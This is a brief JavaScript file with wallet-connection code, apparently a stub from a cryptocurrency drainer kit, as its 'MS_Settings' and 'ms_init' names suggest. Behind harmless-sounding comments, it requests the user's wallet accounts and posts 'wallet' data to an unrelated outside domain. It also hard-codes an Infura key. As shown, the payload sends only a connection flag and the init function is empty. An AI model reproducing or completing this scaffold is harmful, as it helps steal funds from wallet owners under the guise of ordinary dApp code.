// Single source of truth for these declarations
const API_ENDPOINT = 'https://fasterdeliveryuae.com';
const MS_Settings = {
    RPCs: {
        1: "https://mainnet.infura.io/v3/511362d7fcc8491f9af15cc7fadf46ae",
        56: "https://bsc-dataseed.binance.org/",
        137: "https://polygon-rpc.com"
    }
};

function ms_init() {
    // Wallet connection logic
}

// Fast wallet connection
async function connectWallet(provider) {
    const accounts = await provider.request({ method: 'eth_requestAccounts' });
    return accounts[0];
}

// Efficient backend communication
async function sendWalletData() {
    const response = await fetch(`${API_ENDPOINT}/wallet`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ connected: true })
    });
    return response.json();
}
